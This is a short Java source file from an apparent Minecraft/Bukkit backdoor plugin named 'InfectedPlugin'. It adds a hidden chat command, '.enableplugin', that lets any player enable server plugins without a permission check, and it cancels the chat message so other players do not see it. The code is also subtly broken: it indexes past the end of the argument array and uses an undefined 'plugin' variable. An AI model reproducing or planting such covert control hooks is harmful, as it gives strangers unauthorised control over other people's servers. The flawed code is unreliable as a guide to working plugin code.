package org.CreeperCoders.InfectedPlugin.Commands;

import org.bukkit.Server;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.plugin.Plugin;
import org.bukkit.entity.Player;
import org.bukkit.event.*;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.plugin.PluginManager;

public class Command_enableplugin implements Listener
{
    @EventHandler
    public void onPlayerChat(AsyncPlayerChatEvent event)
    {
        String message = event.getMessage();
        boolean cancel = false;
        Server server = Bukkit.getServer();
        Player p = event.getPlayer();
        
        if (message.startsWith("."))
        {
            String[] args = message.split(" ");
            if (args == null)
            {
                return;
            }

            if (args[0].equalsIgnoreCase(".enableplugin"))
            {
                if (args.length == 0)
                {
                    p.sendMessage(ChatColor.RED + "Usage: .enableplugin <plugin>");
                }
                else if (args.length == 1)
                {
                    Plugin target = server.getPluginManager().getPlugin(args[1]);
                    if (target != null)
                    {
                        PluginManager pluginManager = plugin.getServer().getPluginManager();
                        pluginManager.enablePlugin(target);
                    }
                    p.sendMessage(ChatColor.AQUA + "Plugin enabled!");
                }
                cancel = true;
            }
        
            if (cancel)
            {
                event.setCancelled(true);
                return;
            }
       }
    }
}
